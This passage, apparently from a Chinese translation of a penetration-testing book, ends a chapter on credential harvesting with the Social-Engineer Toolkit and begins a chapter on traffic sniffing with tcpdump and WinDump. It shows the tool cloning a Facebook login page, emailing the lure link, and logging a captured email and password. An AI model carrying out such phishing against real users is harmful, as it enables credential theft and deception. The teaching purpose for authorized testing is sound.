  \ url to clone:https://www.facebook.com/login.php\n[*] Cloning the website: https://login.facebook.com/login.php\n\
  [*] This could take a little bit...\nThe best way to use this attack is if username\
  \ and password form\nfields are available. Regardless, this captures all POSTs on\
  \ a website.\n[*] Apache is set to ON - everything will be placed in your web root\
  \ directory of apache.\n[*] Files will be written out to the root directory of apache.\n\
  [*] ALL files are within your Apache directory since you specified it to ON.\nApache\
  \ webserver is set to ON. Copying over PHP file to the website.\nPlease note that\
  \ all output from the harvester will be found under apache_dir/harvester_date.txt\n\
  Feel free to customize post.php in the /var/www/html directory\n[*] All files have\
  \ been copied to /var/www/html\n[*] SET is now listening for incoming credentials.\
  \ You can control-c out of this and completely still keep the attack going.\n[*]\
  \ All files are located under the Apache web root directory: /var/www/html\n[*]\
  \ All fields captures will be displayed below.\n[Credential Harvester is now listening\
  \ below...]\n```\n\n- 6. 由于我正在克隆一个页面，有一些选项我需要输入。我首先需要指定我的 SET 盒子的 IP 地址。然后，我输入我想要克隆的站点。在这种情况下，我选择使用\
  \ Facebook 登录页面，因为每个人都喜欢 Facebook。输入该站点后，SET 将克隆该站点并在准备就绪并等待连接和凭据时通知我。\n\n- 7. 在这一点上，我只需要向用户发送恶意链接。这通过电子邮件非常容易做到。一旦用户点击电子邮件中的链接，它将把他们重定向到我的站点，如下所示：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_107_0.png)\n\n8. 它看起来与实际页面非常相似。如果用户登录到假页面，我将在我的服务器上按如下方式记录他们的信息：\n\
  \n```\n('Array\\n',)\n('site' => http://beefproject.com\n('blog' => http://blog.beefproject.com\n\
  ('lsd' => AVPal...)\n[display] => \\n',\n[enable_profile_selector] => \\n',\n[isprivate]\
  \ => \\n',\n[legacy_return] => 0\\n',\n[profile_selector_ids] => \\n',\n[return_session]\
  \ => \\n',\n[skip_api_login] => \\n',\n[signed_next] => \\n',\n[try_num] => 1\\\
  n',\n[time_zone] => 300\\n',\n[lngmid] => eyl3j...\\n',\n[lqnrnd] => 201107 -V-E\\\
  n',\n[lqnsj] => 1486181780\\n',\n[email] => pentester@hackme.com\\n',\n[pass] =>\
  \ CanYouReadMe\\n',\n[qsstamp] => Wltb...\\n',\n('\\n',)\n```\n\n正如你所见，我已经捕获了该社交媒体网站用户的电子邮件地址和密码。与尝试破解密码或猜测密码相比，这样的过程非常简单。\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_108_0.png)\n\n用户方面的好处是，当他们登录失败时，实际上会被重定向到原始站点。然后他们可以登录，并且会成功。用户只会认为自己输入了错误的电子邮件和密码，但实际上，他们把所有信息都给了我。\n\
  \n由于我正在为利益相关方进行渗透测试，我将记录所有连接到此站点并登录的用户。他们需要接受社会工程学培训，以确保能够识别这些不良链接和站点，并且不会如此轻易地泄露自己的凭证。\n\
  \n## 总结\n\n在第4天结束时，让我们回顾一下我们所做的工作。第4天的目标主要是使用我们选择的漏洞扫描器 OpenVAS 开始探测环境是否存在漏洞。使用\
  \ OpenVAS，我们能够创建一次计划扫描，设置所有所需变量，扫描完成后，如果发现严重程度大于5的漏洞，就会向我发送电子邮件。这是一种节省时间的好方法。\n\n\
  然后我们进入 Metasploit，尝试利用在漏洞扫描期间发现的一些漏洞。这使我能够验证漏洞扫描中包含的发现是否属实。验证很重要，因为我们希望确保记录的是真正存在漏洞的地方，而不是误报。\n\
  \n最后，我们还想使用 BeEF 以及 SET 执行一些社会工程测试，以利用一些基于浏览器的安全漏洞。社会工程是渗透测试中的一个重要阶段，因为用户通常是最薄弱的环节。\n\
  \n在第5章《流量嗅探与欺骗》中，我们将重点关注流量嗅探技术和欺骗。这将包括使用不同的流量嗅探工具，以及了解如何优化我最喜欢的流量嗅探工具 tcpdump。最后，我们将介绍欺骗工具和技术，这些工具和技术将使我们能够执行一些中间人（MiTM）攻击。\n"
- "## 5 流量嗅探与欺骗\n\n理解网络上的流量流向不仅能让你更好地了解网络内部正在发生的事情，还能为渗透测试期间你可能想要攻击的目标提供线索。流量嗅探器允许我们监控或捕获网络上的流量，以查看网络中主机之间发生了什么。它们的工作方式有几种，取决于你是只查看流量，还是想要查看并在流量到达最终目的地之前对其进行更改。这就是欺骗和**中间人攻击**（**MiTM**）的核心思想，我们将在本章中讨论。\n\
  \n本章将讨论以下主题：\n\n- 流量嗅探工具和技术\n- Tcpdump 和过滤器\n- 理解和执行欺骗攻击\n- MiTM 攻击\n\n### 流量嗅探工具和技术\n\
  \n能够看到网络上发生的事情不仅对于理解流量模式和流向很重要，而且对于发现问题所在甚至了解可能成为目标的地方也很重要。例如，如果我作为渗透测试人员在网络上嗅探流量，并注意到有加密流量流向某处，我可能会尝试了解更多正在发生的事情。\n\
  \n我可以尝试对该连接进行 MiTM，以尝试收集信息来验证用户是否注意网站是否安全，或者我可能只是想看看网络是否甚至允许这样做。另一个选择是我可以尝试劫持会话。显然，作为渗透测试人员，我只想知道我能做什么和不能做什么，以便提醒利益相关方需要改进的地方。但作为黑客，我不会这么友善。\n\
  \n市面上有很多嗅探器，你应该找到自己最喜欢的并坚持使用它。然而，在谈论嗅探器选项之前，让我先谈谈不同的嗅探类型。\n\n总的来说，有两种不同的流量嗅探方法：被动和主动。最常见的使用是被动技术。在这种情况下，你只是简单地查看流量。这可以用于故障排除、网络分析，或在道德层面上只是了解流量。非道德地，你可以使用这种嗅探方式来收集凭证或窃取信息或密码，仅举几例。重要的是你只是在查看而不是触碰。这包括使用诸如\
  \ Wireshark、tcpdump 和 WinDump 等程序进行 ARP、TCP 和 UDP 等协议分析。另一方面，如果你查看一侧进入的流量并在它重新进入线路之前更改它，这被称为主动方法。通常，主动嗅探不会带来好事。这包括\
  \ SSLStrip 和 dsniff。它们会更改线路上传输的信息以完成诸如 MiTM 攻击等任务。在本章中，我将探讨这两种情况，以便展示我们如何使用工具进行渗透测试的各种方式。\n\
  \n在开始嗅探之前，请确保你对将要嗅探和欺骗的协议有详细的了解。这很重要，因为如果你不了解协议的内部细节，就无法理解自己在做什么或为什么要做。例如，你应该至少对\
  \ ARP、HTTP、TCP 和 UDP 有深入的了解，因为大多数时候你会使用这些协议。然而，如果你知道自己正在查看特定协议，请尽职调查并研究该协议，以便尽可能多地了解它。\n\
  \n### 嗅探工具\n\n有许多嗅探工具可供使用。你使用的工具很多取决于你所在的平台以及你最终想要做什么。重要的是找到你最喜欢使用的工具并坚持使用。\n\n\
  将数据包发送到你的嗅探器可以通过几种不同的方式实现。一种方法是直接插入已设置为某种 SPAN 端口的交换机端口。通过这种配置，你将在此 SPAN 端口上看到与你设置的配置匹配的流量。也许你有某些接口被\
  \ SPAN 到该端口或特定的 VLAN；无论你如何配置；你将在该端口上看到的流量就是这样。这种方法的优点是，只要你正确配置 SPAN 端口以满足你的需求，你就能看到任何你想要的流量。\n\
  \n另一个选择是基于你从本地网络连接看到的流量运行嗅探器。这是一种简单的方法，因为一旦你有活动连接就可以开始嗅探流量。唯一的缺点是你只能看到该特定第2层网络上的内容，以及源自或目标为你的主机的流量（除非是广播和\
  \ ARP 消息等）。当然，有办法改变这种行为并使用 ARP 欺骗和欺骗等技术监听同一第2层网络上的其他主机，但我稍后会介绍。\n\n以下部分介绍了我实验室中经常使用的一些工具，具体取决于我想要如何进行嗅探。\n\
  \n### Tcpdump\n\nTcpdump 是我有史以来最喜欢的网络实用工具。它是一个基于 CLI 的数据包捕获实用工具，而且非常强大。Tcpdump 允许我们查看任何流量，无论是实时流量还是预先捕获的流量，并对从第1层到第7层的完整协议栈进行深度分析。你可以用\
  \ tcpdump 看到关于数据包的任何你想知道的信息。\n\n作为一名安全和网络人员，每当出现问题时，网络总是被责怪。我几乎每次都会使用 tcpdump 来证明网络是无辜的。记住，网络从不撒谎，而\
  \ tcpdump 可以证明它的清白。\n\n使用 tcpdump 时你会首先注意到的就是它有很多选项：\n\n```\nUsage: tcpdump [-aAbdDefhHIJKlLnNOpqRStUuvxX#]\
  \ [ -B size ] [ -c count ]\n    [ -C file_size ] [ -E algo:secret ] [ -F file ]\
  \ [ -G seconds ]\n[ -i interface ] [ -j tstamp type ] [ -M secret ] [ --number ]\n\
  [ -Q in|out|inout ]\n[ -r file ] [ -s snaplen ] [ --time-stamp-precision precision\
  \ ]\n[ --immediate-mode ] [ -T type ] [ --version ] [ -V file ]\n[ -w file ] [ -W\
  \ filecount ] [ -y datalinktype ] [ -z command ]\n[ -Z user ] [ expression ]\n```\n\
  \n关于 tcpdump 你能学到的最重要的一件事是如何使用过滤器。如果没有它们，你的屏幕很可能会滚动得如此之快，以至于你无法辨认任何内容。让我介绍一下我在渗透测试期间经常使用的一些过滤器。\n\
  \n\n\n我可以使用表达式按单个主机 IP 或主机名进行过滤：\n\n```\ntcpdump host 192.168.34.56\n```\n\n或：\n\
  \n```\ntcpdump host www.thisismydomain.com\n```\n\n如果我们只想查找特定方向的流量，也可以指定 SRC 和 DST\
  \ 主机：\n\n```\ntcpdump src 192.168.13.34\n```\n\n或：\n\n```\ntcpdump 'src 192.168.13.242\
  \ and dst 192.168.31.150'\n```\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_112_0.png)\n\
  \n注意 AND 这个词的使用。如果要组合表达式，可以使用这些典型关键字：AND、OR 和 NOT。您也可以使用括号进行运算顺序。我在组合表达式时也倾向于使用单引号，尽管并非总是必需的。这取决于表达式的复杂程度。然而，这是一个值得养成的良好习惯。\n\
  \n我还可以指定整个网络。如果我不太确定要查看哪些主机或哪些主机是主要通信方，这非常方便。这是通过 CIDR 记法完成的。\n\n```\ntcpdump net\
  \ 192.168.30.0/24\n```\n\n您也可以使用 /32 指定此主机：\n\n```\ntcpdump net 192.168.33.3/32\n\
  ```\n\n指定端口或协议非常重要。大多数情况下，您是在主机上查找非常具体的某样东西，或查找流量的特定端口。在这种情况下，您将使用如下过滤器：\n\n```\n\
  tcpdump tcp\ntcpdump port 22\ntcpdump dst port 22\ntcpdump 'tcp and dst port 22'\n\
  tcpdump 'tcp and dst port 22 and src port 53029'\n```\n\n现在，端口、协议和 IP 地址都已了解，让我们将它们全部组合成一个单一过滤器，以便更具体地进行过滤。此过滤器将查找\
  \ 192.168.1.0/24 网络中 TCP 端口 22 的 SRC：\n\n```\ntcpdump 'tcp and src port 22 and net\
  \ 192.168.1.0/24'\n```\n\n有时您可能不想查看流量，只是想记录下来以便稍后查看或转储到您的 C&C 服务器，该服务器我们在第 3 章《设置和维护命令与控制服务器》中进行了设置。如果是这种情况，您可以使用\
  \ -w 开关并指定文件名。我倾向于使用 .pcap 扩展名，但 .cap 和 .dmp 也比较常见：\n\n```\ntcpdump -w SSHcap.pcap\
  \ 'tcp and dst port 22 and src port 53029\nnet 192.168.1.0/24'\n```\n\n由于我们将流量转储到文件中以便以后读取，肯定需要一种读取这些预先捕获文件的方法。您可以使用\
  \ -r 开关后跟文件名将其读入 tcpdump：\n\n```\ntcpdump -r SSHcap.pcap\n```\n\n以下是我在我的网络上运行 tcpdump\
  \ 的示例。我倾向于使用 -n 标志，因为我不想解析 IP 或端口：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_113_0.png)\n\
  \n## WinDump\n\nWinDump 是 Windows 版的 tcpdump。我认为它是任何 Microsoft 环境的必备工具。有了 WinDump，您就可以直接在\
  \ Windows 机器上分析数据包，使用与您在开源端使用 tcpdump 熟悉的类似过滤器和语法。您甚至可以将 WinDump 捕获到文件中并通过 tcpdump\
  \ 读取。如果您需要直接在 Windows 机器上捕获流量，此实用程序非常方便。\n\n运行 WinDump 时，需要确保已安装 WinPcap。如果您没有 WinPcap，可以从\
  \ WinDump 获取（ http://www.windump.com ）。\n\nWinDump 命令语法的输出如下：\n\n```\nC:\\Users\\\
  jason\\Downloads>windump -?\nwindump version 3.9.5, based on tcpdump version 3.9.5\n\
